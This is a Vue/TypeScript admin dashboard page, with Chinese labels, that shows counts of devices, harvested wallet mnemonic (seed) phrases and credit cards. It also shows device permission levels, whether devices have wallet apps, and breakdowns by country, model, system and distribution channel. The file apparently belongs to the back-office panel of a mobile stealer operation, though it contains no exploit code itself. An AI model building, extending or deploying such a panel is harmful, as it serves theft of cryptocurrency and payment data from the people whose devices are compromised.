<template>
  <div class="home card">
    <div class="stat-row" v-loading="loading">
      <div class="stat-card" v-for="item in statList" :key="item.key">
        <div class="stat-title">{{ item.title }}</div>
        <div class="stat-values">
          <div class="stat-block">
            <span class="label">总数</span>
            <span class="number">{{ item.data.total }}</span>
          </div>
          <div class="stat-block">
            <span class="label">昨日新增</span>
            <span class="number">{{ item.data.yesterday_add }}</span>
          </div>
          <div class="stat-block">
            <span class="label">今日新增</span>
            <span class="number">{{ item.data.today_add }}</span>
          </div>
        </div>
      </div>
    </div>
    <div class="stat-row stat-row-2" v-loading="loading">
      <div class="stat-card">
        <div class="stat-title">授权统计</div>
        <div class="stat-values">
          <div class="stat-block">
            <span class="label">完整授权</span>
            <span class="number">{{ stats.permission_stats.full_auth }}</span>
          </div>
          <div class="stat-block">
            <span class="label">基本授权</span>
            <span class="number">{{ stats.permission_stats.basic_auth }}</span>
          </div>
          <div class="stat-block">
            <span class="label">不授权</span>
            <span class="number">{{ stats.permission_stats.no_auth }}</span>
          </div>
        </div>
      </div>
      <div class="stat-card">
        <div class="stat-title">用户画像</div>
        <div class="stat-values">
          <div class="stat-block" v-for="item in userProfileList" :key="item.key">
            <span class="label">{{ item.label }}</span>
            <span class="number">{{ item.value }}</span>
          </div>
        </div>
      </div>
    </div>
    <div class="group-row" v-loading="loading">
      <div class="group-card" v-for="group in deviceGroupList" :key="group.key">
        <div class="group-title">{{ group.title }}</div>
        <div class="group-list">
          <div class="group-item" v-for="item in group.data" :key="`${group.key}-${item.name}`">
            <span class="name">{{ item.name }}</span>
            <span class="value">{{ item.value }}</span>
          </div>
          <div v-if="group.data.length === 0" class="empty">暂无数据</div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts" name="home">
import { computed, onMounted, ref } from "vue";
import { getHomeStatisticsApi, type HomeStatistics, type DeviceGroupItem } from "@/api/modules/home";

const loading = ref(false);

const stats = ref<HomeStatistics>({
  device: { total: 0, yesterday_add: 0, today_add: 0 },
  words: { total: 0, yesterday_add: 0, today_add: 0 },
  cards: { total: 0, yesterday_add: 0, today_add: 0 },
  permission_stats: { full_auth: 0, basic_auth: 0, no_auth: 0 },
  user_profile: { has_wallet_app: 0, has_wallet_app_and_basic_auth: 0, no_wallet_app: 0 },
  device_groups: { region: [], model: [], system: [], channel: [] }
});

const fetchStatistics = async () => {
  loading.value = true;
  try {
    const res = await getHomeStatisticsApi();
    if (res?.data) {
      stats.value = res.data;
    }
  } finally {
    loading.value = false;
  }
};

const statList = computed(() => [
  { key: "device", title: "设备数", data: stats.value.device },
  { key: "words", title: "助记词数", data: stats.value.words },
  { key: "cards", title: "信用卡数", data: stats.value.cards }
]);

const userProfileList = computed(() => [
  { key: "has_wallet_app_and_basic_auth", label: "有钱包且授权设备", value: stats.value.user_profile?.has_wallet_app_and_basic_auth || 0 },
  { key: "has_wallet_app", label: "有钱包应用", value: stats.value.user_profile?.has_wallet_app || 0 },
  { key: "no_wallet_app", label: "无钱包应用", value: stats.value.user_profile?.no_wallet_app || 0 }
]);

const deviceGroupList = computed((): Array<{ key: string; title: string; data: DeviceGroupItem[] }> => [
  { key: "region", title: "按国家统计", data: stats.value.device_groups.region },
  { key: "model", title: "按机型统计", data: stats.value.device_groups.model },
  { key: "system", title: "按系统统计", data: stats.value.device_groups.system },
  { key: "channel", title: "按渠道统计", data: stats.value.device_groups.channel }
]);

onMounted(fetchStatistics);
</script>

<style scoped lang="scss">
@import "./index.scss";
</style>
